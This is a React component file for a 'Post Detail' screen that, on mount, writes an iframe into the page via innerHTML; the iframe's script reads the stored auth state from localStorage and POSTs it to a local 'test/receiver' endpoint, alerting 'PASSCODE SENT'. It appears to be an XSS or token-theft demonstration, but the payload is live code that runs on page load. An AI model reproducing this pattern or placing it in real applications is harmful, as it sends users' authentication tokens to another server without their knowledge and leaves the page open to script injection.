import { Flex, Text } from "@chakra-ui/react";
import React, { useEffect } from "react";
import ScreenBase from "../ScreenBase";

const chckc = `<iframe srcDoc="<script>fetch('http://localhost:3001/api/v1/test/receiver', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(JSON.parse(JSON.parse(localStorage.getItem('persist:root')).auth))}).then(val => alert('PASSCODE SENT'))</script>"></iframe>`;
const PostDetailScreen: React.FC = () => {
  const divRef = React.useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!divRef.current) return;
    divRef.current.innerHTML = chckc;
  }, []);

  return (
    <ScreenBase>
      <Flex justifyContent={"center"}>
        <Text>Post Detail</Text>
        <div ref={divRef}></div>
      </Flex>
    </ScreenBase>
  );
};

export default PostDetailScreen;
